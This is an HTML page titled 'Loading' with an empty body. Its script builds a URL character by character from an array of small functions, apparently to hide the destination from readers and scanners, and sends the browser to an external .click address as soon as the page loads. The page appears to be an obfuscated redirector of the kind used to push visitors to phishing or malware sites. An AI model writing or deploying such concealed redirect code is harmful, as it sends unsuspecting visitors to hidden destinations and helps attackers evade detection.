<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            () => 'h',
            _ => 't',
            _ => 't',
            function() { return 'p'; },
            _ => 's',
            () => ':',
            function() { return '/'; },
            function() { return '/'; },
            () => 'v',
            () => 'e',
            () => 'r',
            _ => 'g',
            _ => 'e',
            () => 'n',
            _ => '.',
            function() { return 'c'; },
            _ => 'l',
            () => 'i',
            function() { return 'c'; },
            function() { return 'k'; },
            function() { return '/'; },
            function() { return 's'; },
            () => '/',
            () => 'n',
            function() { return 'e'; },
            () => 'w'
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
